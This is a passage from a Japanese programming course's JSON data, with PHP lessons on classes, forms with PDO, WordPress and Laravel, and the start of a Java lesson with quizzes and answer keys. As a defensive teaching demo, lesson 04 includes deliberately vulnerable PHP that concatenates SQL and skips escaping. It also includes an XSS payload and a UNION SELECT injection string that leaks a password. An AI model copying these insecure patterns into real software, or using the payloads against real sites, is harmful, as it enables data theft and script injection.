[new Product(\"牛乳\", 200), $apple];\nusort($items, fn($a, $b) => $a->price() <=> $b->price());\nforeach ($items as $i) echo $i->name, \"=\", $i->price(), \" \";\n// りんご=110 牛乳=220\n```\n\n`<=>`（宇宙船演算子）は、左が小さければ -1、同じなら 0、大きければ 1 を返します。Python の `sorted(items, key=lambda i: i.price())` です。\n\n## 名前空間と use\n\nAI の PHP のコード（特に Laravel）は、ファイルの先頭がこうなっていることが多いです。\n\n```php\n<?php\n\nnamespace App\\Http\\Controllers;\n\nuse App\\Models\\Task;\nuse Illuminate\\Http\\Request;\n\nclass TaskController extends Controller\n{\n    ...\n}\n```\n\n| 書き方 | 意味 | Python で言うと |\n|---|---|---|\n| `namespace App\\Http\\Controllers;` | このクラスの「住所」 | パッケージ（フォルダ） |\n| `use App\\Models\\Task;` | 別の住所のクラスを、短い名前で使う | `from app.models import Task` |\n| `\\`（バックスラッシュ） | 住所の区切り | `.` |\n\nComposer（PHP のパッケージ管理。`composer.json` が `package.json` に当たる）が、この住所とファイルの場所を対応させて、自動で読み込んでくれます。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `$this->taskService->create($data)` | 自分の持っている taskService の create を呼ぶ |\n| `Task::where('done', false)->get()` | static のメソッドから始まる、Laravel のデータベースの書き方（レッスン 5） |\n| `public function __construct(private TaskRepository $repo) {}` | 必要な部品を受け取る（依存性注入。FastAPI の Depends に近い） |\n| `self::` / `static::` | 自分のクラスの定数や static メソッド |\n| `?string $name` | string か null（Python の `str \\| None`） |\n| `$obj?->name` | obj が null なら null（JavaScript の `?.`） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "PHP で、オブジェクト `$apple` の `price` メソッドを呼ぶ書き方は？",
        "choices": [
         "`$apple.price()`",
         "`$apple->price()`",
         "`$apple::price()`"
        ],
        "answer": 1,
        "explain": "PHP では `->` でメソッドやプロパティを使います。`.` は文字列をつなぐ演算子で、`::` は static メソッドやクラスの定数に使います。"
       },
       {
        "question": "`public function __construct(private int $basePrice) {}` は何をしている？",
        "choices": [
         "basePrice という private のプロパティを作り、渡された値を入れている",
         "basePrice を返す関数を作っている",
         "basePrice を外から変えられるようにしている"
        ],
        "answer": 0,
        "explain": "PHP 8 の書き方で、引数に public や private を付けると、プロパティの宣言と代入をまとめて行います。"
       },
       {
        "question": "`private` のプロパティを、クラスの外から `$apple->basePrice` で読むと？",
        "choices": [
         "読める（private はお願いなだけ）",
         "エラーになる",
         "null が返る"
        ],
        "answer": 1,
        "explain": "PHP の private は本当にアクセスできません。Python の `_` で始まる名前とは違います。"
       }
      ]
     ],
     "id": "03-classes"
    },
    {
     "title": "フォームとデータベース ― $_POST・PDO・htmlspecialchars",
     "level": 2,
     "minutes": 22,
     "concepts": [
      "http_api",
      "database",
      "security",
      "backend"
     ],
     "summary": "1 ファイルで動くメモ帳のアプリを読む。$_GET・$_POST、PDO の prepare と ?、htmlspecialchars でのエスケープ、POST の後のリダイレクト。同じアプリを危ない書き方にしたものに攻撃を送り、パスワードが漏れ、HTML が実行されるのを確かめる。",
     "body": "## このレッスンのゴール\n\n- `$_GET`・`$_POST`・`$_SERVER['REQUEST_METHOD']` を読める\n- PDO の `prepare` と `?` で SQL インジェクションを防ぐ書き方が分かる\n- `htmlspecialchars` で XSS を防ぐ理由を、実際の結果で説明できる\n\n## 1 ファイルのメモ帳\n\nPHP は、**1 つのファイルが 1 つのページ** になる作りが基本です。メモを書いて一覧にするアプリです。\n\n```php\n<?php\ndeclare(strict_types=1);\n\n$pdo = new PDO('sqlite:' . __DIR__ . '/memo.db');\n$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n$pdo->exec('CREATE TABLE IF NOT EXISTS memos (id INTEGER PRIMARY KEY, body TEXT NOT NULL)');\n\n$error = '';\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $body = trim($_POST['body'] ?? '');\n    if ($body === '' || mb_strlen($body) > 200) {\n        $error = 'メモは 1〜200 文字で入力してください';\n    } else {\n        $stmt = $pdo->prepare('INSERT INTO memos (body) VALUES (?)');\n        $stmt->execute([$body]);\n        header('Location: /');\n        exit;\n    }\n}\n\n$q = $_GET['q'] ?? '';\n$stmt = $pdo->prepare('SELECT id, body FROM memos WHERE body LIKE ? ORDER BY id DESC');\n$stmt->execute(['%' . $q . '%']);\n$memos = $stmt->fetchAll(PDO::FETCH_ASSOC);\n\nfunction h(string $s): string {\n    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');\n}\n?>\n<!doctype html>\n<html lang=\"ja\">\n<head><meta charset=\"utf-8\"><title>メモ</title></head>\n<body>\n  <h1>メモ</h1>\n  <?php if ($error): ?>\n    <p class=\"error\"><?= h($error) ?></p>\n  <?php endif; ?>\n  <form method=\"post\">\n    <input name=\"body\">\n    <button type=\"submit\">追加</button>\n  </form>\n  <form method=\"get\"><input name=\"q\" value=\"<?= h($q) ?>\"><button>検索</button></form>\n  <ul>\n    <?php foreach ($memos as $m): ?>\n      <li>#<?= $m['id'] ?> <?= h($m['body']) ?></li>\n    <?php endforeach; ?>\n  </ul>\n</body>\n</html>\n```\n\nPHP には **開発用のサーバー** が入っているので、`php -S 127.0.0.1:8090` だけで動かせます。このレッスンの結果は、そうして起動して `curl` でリクエストを送ったものです。\n\n## 上半分：処理\n\n### リクエストの中身\n\n| 書き方 | 中身 | FastAPI で言うと |\n|---|---|---|\n| `$_SERVER['REQUEST_METHOD']` | `GET` / `POST` | `request.method` |\n| `$_POST['body']` | フォームの `name=\"body\"` の値（HTML/CSS コースのレッスン 2） | `body: str = Form()` |\n| `$_GET['q']` | URL の `?q=...` | `q: str = \"\"`（クエリ） |\n| `$_FILES` / `$_COOKIE` / `$_SESSION` | アップロードされたファイル・Cookie・セッション | |\n\n`$_POST` などは **スーパーグローバル** と呼ばれ、どこからでも読める特別な配列です。値は **すべて文字列**（か配列）で、利用者が自由に作れます（セキュリティのコースのレッスン 1）。\n\n### チェックして保存\n\n```php\n$body = trim($_POST['body'] ?? '');\nif ($body === '' || mb_strlen($body) > 200) {\n    $error = 'メモは 1〜200 文字で入力してください';\n}\n```\n\n`?? ''` で「無ければ空文字」、`trim` で前後の空白を消し、`mb_strlen`（文字数。レッスン 1）で長さを確かめています。`===` を使っているのもポイントです。\n\n```text\n$ curl -X POST -d 'body=' http://127.0.0.1:8090/\n...<p class=\"error\">メモは 1〜200 文字で入力してください</p>...\n```\n\n### PDO の prepare と ?\n\n```php\n$stmt = $pdo->prepare('INSERT INTO memos (body) VALUES (?)');\n$stmt->execute([$body]);\n```\n\n**PDO** は、PHP の標準のデータベースの道具です（SQLite・MySQL・PostgreSQL を同じ書き方で使える）。`prepare` で SQL の形を決め、`execute` で `?` に値をはめ込みます。Python の `conn.execute(\"... VALUES (?)\", (body,))` とまったく同じ考え方で、**SQL インジェクションを防ぎます**（セキュリティのコースのレッスン 3）。\n\n`:body` のように名前を付けて、`execute(['body' => $body])` と書くこともあります。\n\n### POST の後はリダイレクト\n\n```php\nheader('Location: /');\nexit;\n```\n\n```text\n$ curl -X POST -d 'body=牛乳を買う' http://127.0.0.1:8090/\n302 -> http://127.0.0.1:8090/\n```\n\n保存に成功したら、**302 で一覧のページに移動させています**（PRG パターン：Post → Redirect → Get）。こうしないと、ブラウザで再読み込みしたときに「フォームを再送信しますか？」と出て、同じメモが 2 回保存されてしまいます。\n`exit;` を忘れると、移動の指示を出した後も下の処理が続くので、必ずセットで書きます。\n\n## 下半分：HTML\n\n```php\n<?php foreach ($memos as $m): ?>\n  <li>#<?= $m['id'] ?> <?= h($m['body']) ?></li>\n<?php endforeach; ?>\n```\n\n`foreach (...):` と `endforeach;` は、HTML の中で使いやすい書き方です（`if ...:` と `endif;` も同じ）。`<?= ... ?>` は echo の短い書き方です。\n\n### htmlspecialchars\n\n```php\nfunction h(string $s): string {\n    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');\n}\n```\n\n`<`・`>`・`&`・`\"`・`'` を、文字参照（`&lt;` など）に変えるエスケープです（セキュリティのコースのレッスン 4）。毎回書くと長いので、`h()` という短い名前の関数にするのが PHP の昔からの定番です。\n\nメモに HTML を書いて保存してみました。\n\n```text\n$ curl -X POST --data-urlencode 'body=<img src=x onerror=alert(1)>' http://127.0.0.1:8090/\n$ curl http://127.0.0.1:8090/\n<li>#2 &lt;img src=x onerror=alert(1)&gt;</li>\n<li>#1 牛乳を買う</li>\n```\n\n`<img ...>` が **文字として** 表示され、実行されません。\n\n## 危ない書き方と比べる\n\n同じアプリを、AI が書きがちな **危ない形** にしてみました（説明のため、ユーザーとパスワードの表も同じデータベースに置いています）。\n\n```php\n<?php\n$pdo = new PDO('sqlite:' . __DIR__ . '/memo.db');\n...\nif (isset($_POST['body'])) {\n    $pdo->exec(\"INSERT INTO memos (body) VALUES ('\" . $_POST['body'] . \"')\");   // ⚠️ 文字列をつなげて SQL\n}\n$q = $_GET['q'] ?? '';\n$rows = $pdo->query(\"SELECT id, body FROM memos WHERE body LIKE '%$q%'\")->fetchAll();   // ⚠️\nforeach ($rows as $m) { echo \"<li>#{$m['id']} {$m['body']}</li>\\n\"; }                 // ⚠️ エスケープ無し\n```\n\n### XSS\n\n```text\n<li>#1 牛乳を買う</li>\n<li>#2 <img src=x onerror=alert(1)></li>      ← HTML のまま出ている。ブラウザで開くと実行される\n```\n\n### SQL インジェクション\n\n検索の欄に `' UNION SELECT name, password FROM users --` を入れました。\n\n```text\n<li>#1 牛乳を買う</li>\n<li>#2 <img src=x onerror=alert(1)></li>\n<li>#admin s3cret</li>                          ← ユーザー名とパスワードが表示された\n```\n\n安全な方に同じ検索を送ると、**0 件** でした（「`' UNION ...` という文字を含むメモ」を探しただけなので）。\n\n| | 安全な書き方 | 危ない書き方 |\n|---|---|---|\n| SQL | `prepare('... ?')` ＋ `execute([$v])` | `\"... '\" . $v . \"'\"` / `\"... '%$q%'\"` |\n| 表示 | `htmlspecialchars` | そのまま `echo` |\n| 結果 | 攻撃は文字として扱われる | パスワードが漏れ、HTML が実行される |\n\nPHP は歴史が長いので、**ネット上の古いサンプルや、それを学んだ AI のコードに、危ない書き方がまだ多く残っています**。古い `mysql_query()`（PHP 7 で削除済み）を見かけたら、かなり古いコードです。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 判定 |\n|---|---|\n| `$pdo->query(\"... $var ...\")` / `\"...\" . $_GET[...] . \"...\"` を SQL に | ⚠️ SQL インジェクション。`prepare` ＋ `?` に |\n| `echo $_GET['name'];` / `<?= $row['body'] ?>` | ⚠️ XSS。`htmlspecialchars` を通す |\n| `header('Location: ...');` の後に `exit;` が無い | ⚠️ 下の処理が続く |\n| `$_POST['price']` をそのまま金額に | ⚠️ 書き換えられる（HTML/CSS コースの hidden の話） |\n| パスワードを `md5()` で保存 | ⚠️ `password_hash()` と `password_verify()` を使う（PHP の標準。中は bcrypt） |\n| `PDO::ERRMODE_EXCEPTION` | ✅ データベースのエラーを例外にする（無いと失敗に気づけない） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "PHP で、フォームの `<input name=\"title\">` の値を受け取るのは？（method=\"post\"）",
        "choices": [
         "`$_POST['title']`",
         "`$_GET['title']`",
         "`$title`"
        ],
        "answer": 0,
        "explain": "POST で送られたフォームの値は `$_POST` に、URL の `?title=...` は `$_GET` に入ります。無いこともあるので `$_POST['title'] ?? ''` と書くのが定番です。"
       },
       {
        "question": "`$pdo->prepare('SELECT * FROM memos WHERE id = ?')` の後、`execute([$id])` で値を渡す理由は？",
        "choices": [
         "速くするため",
         "SQL の形と値を別々に渡し、値が SQL の命令として解釈されないようにするため",
         "id を数に変換するため"
        ],
        "answer": 1,
        "explain": "プレースホルダで渡すと、`' UNION ...` のような入力もただの文字として扱われます。実際に、危ない書き方ではパスワードが漏れました。"
       },
       {
        "question": "保存に成功した後に `header('Location: /'); exit;` とする理由は？",
        "choices": [
         "保存を確定させるため",
         "一覧のページに移動させ、再読み込みで同じ内容が 2 回送信されるのを防ぐため",
         "エラーを隠すため"
        ],
        "answer": 1,
        "explain": "POST の後にリダイレクトしておけば、再読み込みしても GET の一覧が読み直されるだけです（PRG パターン）。"
       }
      ]
     ],
     "id": "04-forms-database"
    },
    {
     "title": "WordPress と Laravel のコードを読む",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "reading",
      "backend",
      "security",
      "ai_coding"
     ],
     "summary": "PHP で出会うことが多い 2 つの世界。WordPress のテーマ（ループ・テンプレートタグ・フック・esc_html）と、Laravel（ルーティング・コントローラー・Eloquent・Blade・バリデーション）。どこを見ればよいかと、セキュリティの確認ポイント。",
     "body": "## このレッスンのゴール\n\n- WordPress のテーマのファイルを読み、「ループ」「テンプレートタグ」「フック」が分かる\n- Laravel のルート・コントローラー・モデル・ビューのつながりを説明できる\n- どちらのコードでも、エスケープ・SQL・権限の確認ポイントが分かる\n\nこのレッスンのコードは、WordPress と Laravel の書き方の説明のための抜粋です（WordPress 本体や Laravel のアプリをここでは動かしていません）。\n\n## WordPress\n\n**WordPress** は、ブログや会社のサイトを作るための仕組み（CMS）で、世界の Web サイトのとても大きな割合で使われています。管理画面で記事を書き、**テーマ**（見た目）と **プラグイン**（機能）を PHP で作ります。\n\n### テーマのファイル\n\n```text\nwp-content/themes/my-theme/\n├── style.css          テーマの名前などの情報 ＋ CSS\n├── functions.php      テーマの設定・機能の追加（フック）\n├── index.php          記事一覧（どれにも当てはまらないときの最後の砦）\n├── single.php         記事 1 つのページ\n├── page.php           固定ページ\n├── header.php         共通の頭の部分\n└── footer.php         共通の終わりの部分\n```\n\nURL によって、WordPress が **どのファイルを使うかを自動で選びます**（テンプレート階層）。記事のページなら `single.php`、無ければ `index.php`、のような順番です。\n\n### ループ\n\n```php\n<?php get_header(); ?>\n\n<main>\n  <?php if ( have_posts() ) : ?>\n    <?php while ( have_posts() ) : the_post(); ?>\n      <article>\n        <h2><a href=\"<?php the_permalink(); ?>\"><?php the_title(); ?></a></h2>\n        <p class=\"date\"><?php echo get_the_date(); ?></p>\n        <?php the_excerpt(); ?>\n      </article>\n    <?php endwhile; ?>\n  <?php else : ?>\n    <p>記事がありません。</p>\n  <?php endif; ?>\n</main>\n\n<?php get_footer(); ?>\n```\n\n| 部分 | 意味 |\n|---|---|\n| `get_header()` / `get_footer()` | header.php / footer.php を読み込む |\n| `have_posts()` | 表示する記事がまだあるか |\n| `the_post()` | 次の記事を「今の記事」にする |\n| `the_title()` / `the_permalink()` / `the_excerpt()` | 今の記事のタイトル・URL・抜粋を **表示する** |\n| `get_the_date()` | 今の記事の日付を **返す**（表示はしない） |\n\nこの `while ( have_posts() ) : the_post();` を **ループ** と呼びます。Python で言うと `for post in posts:` で、`the_post()` が「次の 1 件を取り出す」役です。\n\n⚠️ WordPress の関数には、**`the_` で始まるものは表示する（echo する）、`get_` で始まるものは値を返す** という決まりがあります。`echo the_title();` は二重になり、`get_the_title();` だけでは何も表示されません。\n\n### functions.php とフック\n\n```php\n<?php\n// テーマの機能を有効にする\nadd_action( 'after_setup_theme', function () {\n    add_theme_support( 'title-tag' );\n    add_theme_support( 'post-thumbnails' );\n} );\n\n// CSS と JavaScript を読み込む\nadd_action( 'wp_enqueue_scripts', function () {\n    wp_enqueue_style( 'my-theme', get_stylesheet_uri(), [], '1.0' );\n} );\n\n// 抜粋の長さを変える\nadd_filter( 'excerpt_length', fn( $length ) => 40 );\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `add_action( 'きっかけ', 関数 )` | 「このタイミングで、この関数も実行して」（**アクションフック**） |\n| `add_filter( 'きっかけ', 関数 )` | 「この値を出す前に、この関数で加工して」（**フィルターフック**）。関数は値を受け取って返す |\n\nWordPress の本体には「ここでフックを呼ぶ」場所がたくさん用意されていて、テーマやプラグインは **本体を書き換えずに、フックで動きを足したり変えたり** します。JavaScript の `addEventListener`（JavaScript コースのレッスン 6）と似た考え方です。\n\n### WordPress のエスケープ\n\n```php\n<h2><?php echo esc_html( $title ); ?></h2>\n<a href=\"<?php echo esc_url( $link ); ?>\">リンク</a>\n<input value=\"<?php echo esc_attr( $value ); ?>\">\n```\n\n| 関数 | 使う場所 |\n|---|---|\n| `esc_html()` | HTML の中の文字 |\n| `esc_attr()` | 属性の値（`value=\"...\"` など） |\n| `esc_url()` | URL（`javascript:` で始まる危ない URL も取り除く） |\n| `wp_kses_post()` | 記事の本文のように、一部の HTML を許したいとき（サニタイズ） |\n\nレッスン 4 の `htmlspecialchars` の、**場所ごとの WordPress 版** です。`the_title()` などのテンプレートタグは中で処理してくれますが、自分で `get_` した値や、`$_GET` などを表示するときは、必ずこれらを通します。\n\n### データベースと権限\n\n```php\nglobal $wpdb;\n$rows = $wpdb->get_results(\n    $wpdb->prepare( \"SELECT * FROM {$wpdb->prefix}orders WHERE user_id = %d\", $user_id )\n);\n\nif ( ! current_user_can( 'edit_posts' ) ) {\n    wp_die( '権限がありません' );\n}\ncheck_admin_referer( 'my_action' );   // フォームの CSRF トークン（nonce）を確かめる\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `$wpdb->prepare( \"... %d\", $v )` | WordPress 版のプレースホルダ（`%d` 数、`%s` 文字列） |\n| `current_user_can( '権限' )` | ログイン中の人に、その権限があるか（認可） |\n| `wp_nonce_field()` / `check_admin_referer()` | **nonce**（使い捨てのトークン）で CSRF を防ぐ（セキュリティのコースのレッスン 5） |\n\nWordPress のプラグインの脆弱性の多くは、**このどれかを忘れたもの** です。\n\n## Laravel\n\n**Laravel** は、PHP でいちばん人気の Web アプリのフレームワークです。Python の Django や、FastAPI ＋ SQLAlchemy に近い位置づけです。\n\n### つながり\n\n```text\nroutes/web.php            URL → どのコントローラーのどのメソッドか\napp/Http/Controllers/     リクエストを受けて、処理して、返す\napp/Models/               データベースのテーブル（Eloquent ORM）\nresources/views/          HTML のテンプレート（Blade）\ndatabase/migrations/      テーブルの変更履歴（マイグレーション）\n```\n\n### ルート\n\n```php\n// routes/web.php\nuse App\\Http\\Controllers\\TaskController;\n\nRoute::get('/tasks', [TaskController::class, 'index']);\nRoute::post('/tasks', [TaskController::class, 'store'])->middleware('auth');\n```\n\n「GET /tasks に来たら TaskController の index」。`->middleware('auth')` は **ログインしている人だけ**（FastAPI の `Depends(get_current_user)`）。\n\n### コントローラー\n\n```php\n// app/Http/Controllers/TaskController.php\nnamespace App\\Http\\Controllers;\n\nuse App\\Models\\Task;\nuse Illuminate\\Http\\Request;\n\nclass TaskController extends Controller\n{\n    public function index()\n    {\n        $tasks = Task::where('user_id', auth()->id())->orderBy('created_at', 'desc')->get();\n        return view('tasks.index', ['tasks' => $tasks]);\n    }\n\n    public function store(Request $request)\n    {\n        $validated = $request->validate([\n            'title' => 'required|string|max:200',\n        ]);\n        $request->user()->tasks()->create($validated);\n        return redirect('/tasks');\n    }\n}\n```\n\n| 部分 | 意味 | Python で言うと |\n|---|---|---|\n| `Task::where('user_id', auth()->id())` | ログイン中の人のタスクだけ（**認可**。IDOR を防ぐ） | `select(Task).where(Task.user_id == user.id)` |\n| `->orderBy(...)->get()` | 並べ替えて取得（Eloquent。中ではプレースホルダの SQL） | SQLAlchemy |\n| `$request->validate([...])` | **バリデーション**。失敗したら自動でフォームに戻り、エラーを表示 | Pydantic |\n| `'required\\|string\\|max:200'` | 必須・文字列・200 文字まで | `title: str = Field(max_length=200)` |\n| `->create($validated)` | **チェック済みの値だけ** で作る（マスアサインメント対策） | |\n| `return redirect('/tasks')` | レッスン 4 の PRG パターン | |\n\n### モデルとマスアサインメント\n\n```php\nclass Task extends Model\n{\n    protected $fillable = ['title'];   // create() で入れてよい項目\n}\n```\n\n`$fillable` は **「外から一括で入れてよい項目の許可リスト」** です。`Task::create($request->all())` と書いても、`user_id` や `is_admin` は入りません（セキュリティのコースのレッスン 5 のマスアサインメント対策が、フレームワークに組み込まれている）。⚠️ `protected $guarded = [];`（何でも入れてよい）と書かれていたら要注意です。\n\n### Blade のテンプレート\n\n```blade\n{{-- resources/views/tasks/index.blade.php --}}\n<ul>\n  @foreach ($tasks as $task)\n    <li>{{ $task->title }}</li>\n  @endforeach\n</ul>\n\n<form method=\"POST\" action=\"/tasks\">\n  @csrf\n  <input name=\"title\" value=\"{{ old('title') }}\">\n  @error('title') <p>{{ $message }}</p> @enderror\n  <button>追加</button>\n</form>\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `{{ $x }}` | **自動でエスケープして** 表示（`htmlspecialchars` を自動で） |\n| `{!! $x !!}` | ⚠️ エスケープ **しない**（React の `dangerouslySetInnerHTML` と同じ危険） |\n| `@foreach` / `@if` | 繰り返し・条件 |\n| `@csrf` | CSRF のトークンをフォームに入れる（無いと 419 エラー） |\n| `old('title')` | バリデーションで戻ってきたとき、入力した値を残す |\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| WordPress で `echo $_GET['s'];` / `echo get_the_title();` をそのまま | ⚠️ `esc_html()` を通す |\n| `$wpdb->query( \"... $id ...\" )` | ⚠️ `$wpdb->prepare()` に |\n| WordPress の管理画面の処理に `current_user_can` や nonce の確認が無い | ⚠️ 権限・CSRF |\n| Laravel の `{!! ... !!}` | ⚠️ 中身が外から来るならエスケープかサニタイズ |\n| `Task::find($id)` だけで、持ち主を確かめていない | ⚠️ IDOR。`where('user_id', ...)` か Policy（Laravel の認可の仕組み） |\n| `$guarded = []` / `$request->all()` をそのまま `create` | ⚠️ マスアサインメント |\n| `DB::raw(\"... $var ...\")` / `whereRaw(\"... $var\")` | ⚠️ 生の SQL。`?` と配列で値を渡す |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "WordPress で `the_title()` と `get_the_title()` の違いは？",
        "choices": [
         "`the_title()` は表示し、`get_the_title()` は値を返す",
         "同じもの",
         "`get_the_title()` は管理画面でしか使えない"
        ],
        "answer": 0,
        "explain": "WordPress では、the_ で始まる関数は表示、get_ で始まる関数は値を返す、という決まりがあります。"
       },
       {
        "question": "WordPress の `add_filter( 'excerpt_length', fn( $length ) => 40 );` は何をしている？",
        "choices": [
         "抜粋を 40 個表示する",
         "抜粋の長さを決める値を、本体を書き換えずに 40 に変える",
         "40 文字以上の記事を消す"
        ],
        "answer": 1,
        "explain": "フィルターフックは「値を出す前に加工する」仕組みです。本体を直接書き換えずに動きを変えられます。"
       },
       {
        "question": "Laravel の Blade で `{{ $title }}` と `{!! $title !!}` の違いは？",
        "choices": [
         "同じ",
         "`{{ }}` は自動でエスケープし、`{!! !!}` はエスケープしない（外からの値なら XSS の危険）",
         "`{!! !!}` のほうが安全"
        ],
        "answer": 1,
        "explain": "`{{ }}` は htmlspecialchars を自動で通します。`{!! !!}` は HTML をそのまま出すので、中身が信頼できるときだけ使います。"
       }
      ]
     ],
     "id": "05-wordpress-laravel"
    }
   ],
   "status": "open"
  },
  {
   "title": "Java",
   "icon": "☕",
   "order": 91,
   "category": "language",
   "description": "銀行や企業の業務システム、Android で使われる言語。クラスと main、静的型と == / equals の違い、クラス・インターフェース・record、検査例外と try-with-resources、コレクションと Stream、最後に Spring Boot のコードを読む。Java 21 で実行して確かめたもの。",
   "levels": {
    "1": "入門：形と型",
    "2": "基礎：クラスと例外",
    "3": "実践：Stream と Spring"
   },
   "id": "91-java",
   "lessons": [
    {
     "title": "クラスと main メソッド ― Java のプログラムの形",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "basics",
      "classes",
      "tooling"
     ],
     "summary": "public static void main(String[] args) の 1 語ずつの意味、ファイル名とクラス名の関係、javac でコンパイルして java で実行する流れ、System.out.println と printf、文字列の + の落とし穴、日本語が ??? になるとき。",
     "body": "## このレッスンのゴール\n\n- `public class Hello` と `public static void main(String[] args)` を 1 語ずつ説明できる\n- `javac` と `java` の役割の違いが分かる\n- Java のコンパイルエラーの読み方が分かる\n\n## Java とは\n\n**Java** は、銀行・保険・役所などの **大きな業務システム** や、Android のアプリ（今は Kotlin が主流）で長く使われてきた言語です。**型をしっかり書く**、**すべてをクラスの中に書く** のが特徴で、コードは長めですが、大人数で長く保守するのに向いています。\n\n## 最初のプログラム\n\n```java\nimport java.util.List;\n\npublic class Hello {\n    static String greet(String name) {\n        return \"こんにちは、\" + name + \" さん\";\n    }\n\n    public static void main(String[] args) {\n        System.out.println(greet(\"Ryo\"));\n        int price = 120;\n        int count = 3;\n        System.out.println(\"合計 \" + price * count + \" 円\");\n        System.out.printf(\"%s は %d 歳です%n\", \"Hana\", 30);\n        var fruits = List.of(\"りんご\", \"バナナ\");\n        System.out.println(fruits + \" \" + fruits.size());\n    }\n}\n```\n\n```text\nこんにちは、Ryo さん\n合計 360 円\nHana は 30 歳です\n[りんご, バナナ] 2\n```\n\n（このコースの出力とエラーは、すべて Java 21 で実際にコンパイル・実行したものです）\n\n### public static void main(String[] args)\n\nJava の入口は、この呪文のような 1 行です。1 語ずつ見ます。\n\n| 部分 | 意味 |\n|---|---|\n| `public` | どこからでも呼べる（Java の実行の仕組みが外から呼ぶので） |\n| `static` | クラスのインスタンス（`new` で作るもの。レッスン 3）を作らずに呼べる |\n| `void` | 何も返さない（Python の `-> None`） |\n| `main` | 入口の名前。**必ず main** |\n| `String[] args` | コマンドラインの引数（`java Hello a b` なら 2 つ）。Python の `sys.argv[1:]` |\n\nPython の `if __name__ == \"__main__\":` に当たる部分を、Java では **クラスの中のメソッド** として書きます。Java では、関数も変数も、**すべてどこかのクラスの中** に書く決まりです。\n\n| Java | Python で言うと |\n|---|---|\n| `public class Hello { ... }` | ファイル全体（モジュール） |\n| `static String greet(String name)` | `def greet(name: str) -> str:` |\n| `System.out.println(x)` | `print(x)` |\n| `System.out.printf(\"%s %d%n\", ...)` | `print(\"%s %d\" % (...))`（`%n` は改行） |\n| `{ }` と `;` | インデントと改行の代わり |\n| `// ...` / `/* ... */` | コメント |\n\n### ⚠️ ファイル名＝クラス名\n\n`public class Hello` は、**`Hello.java` というファイル** に書かないとコンパイルできません。大文字・小文字も同じにします。Java のファイルの名前がいつも大文字で始まるのはこのためです。\n\n## コンパイルして実行する\n\n```bash\njavac Hello.java      # コンパイル → Hello.class ができる\njava Hello a b        # 実行（.class は付けない）\njava Hello.java       # 1 ファイルだけなら、コンパイルと実行を一度に（Java 11 から）\n```\n\n| 道具 | 意味 |\n|---|---|\n| `javac` | Java のコンパイラ。`.java` を **バイトコード**（`.class`）に変換 |\n| `java` | **JVM**（Java 仮想マシン）でバイトコードを実行 |\n| Maven（`pom.xml`）・Gradle（`build.gradle`） | ライブラリの管理とビルド（Python の pip ＋ pyproject、JavaScript の npm に当たる） |\n\nJava のプログラムは、Windows・Mac・Linux のどこでも **同じ `.class` が JVM の上で動く** のが特徴です（「一度書けばどこでも動く」）。Go や Rust のように OS ごとの実行ファイルを作るのとは違い、動かす側に Java（JVM）が必要です。\n\n## コンパイルエラーの読み方\n\n```java\nint price = 120\n```\n\n```text\nBad.java:3: error: ';' expected\n        int price = 120\n                       ^\n1 error\n```\n\n| 部分 | 意味 |\n|---|---|\n| `Bad.java:3:` | ファイル名と行 |\n| `';' expected` | 「ここに `;` が必要」 |\n| `^` | その場所 |\n\nJava のエラーは、Rust ほど親切な提案はしませんが、**場所と理由** ははっきり書かれます。`cannot find symbol`（名前が見つからない＝打ち間違いか import 忘れ）、`incompatible types`（型が合わない）もよく見ます。\n\n## 文字列の + の落とし穴\n\n```java\nSystem.out.println(\"合計 \" + price * count + \" 円\");   // 合計 360 円\nSystem.out.println(\"合計 \" + price + count + \" 円\");   // 合計 1203 円\n```\n\n`+` は左から順に計算されます。2 つ目は `\"合計 \" + 120` で **文字列 \"合計 120\" になってから**、`+ 3` で \"合計 1203\" になりました。数どうしを先に計算したいときは、`*` のように先に計算される演算子にするか、かっこで囲みます（`\"合計 \" + (price + count)`）。JavaScript でも同じことが起きます。\n\n## ⚠️ 日本語が ??? になる\n\nこの教材を作っている環境で最初に実行したとき、こう表示されました。\n\n```text\n??????Ryo ??\n?? 360 ?\n```\n\nJava は、画面に書き出すときの文字コードを **OS の設定**（ロケール）に合わせます。その環境の設定が日本語に対応していなかったため、日本語が `?` に置き換えられていました（設定を UTF-8 にしたら直りました）。Windows の古いコマンドプロンプトでも同じことが起きます。コンピュータの基礎コースの「文字化け」の仲間で、`java -Dstdout.encoding=UTF-8 Hello` のように指定して直すこともできます。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `package com.example.shop;` | このクラスの住所。フォルダの `com/example/shop/` に対応 |\n| `import java.util.*;` | java.util の中のクラスを全部使えるように |\n| `src/main/java/...` と `src/test/java/...` | Maven・Gradle の決まったフォルダの形（本体とテスト） |\n| `pom.xml` / `build.gradle` | 使うライブラリ（依存関係）の一覧 |\n| `./mvnw spring-boot:run` / `./gradlew build` | プロジェクトに同梱されたビルドの道具を実行 |\n| `@Override` などの `@` | アノテーション（レッスン 3・6） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`public static void main(String[] args)` の `String[] args` は何？",
        "choices": [
         "main が返す値",
         "プログラムを実行するときに渡されたコマンドラインの引数",
         "クラスの名前の一覧"
        ],
        "answer": 1,
        "explain": "`java Hello a b` なら args は `[\"a\", \"b\"]` の 2 つです。Python の `sys.argv[1:]` に当たります。"
       },
       {
        "question": "`public class Shop` を書くファイルの名前は？",
        "choices": [
         "`Shop.java`",
         "`shop.java`",
         "何でもよい"
        ],
        "answer": 0,
        "explain": "public なクラスの名前と、ファイル名は大文字・小文字まで同じにする必要があります。"
       },
       {
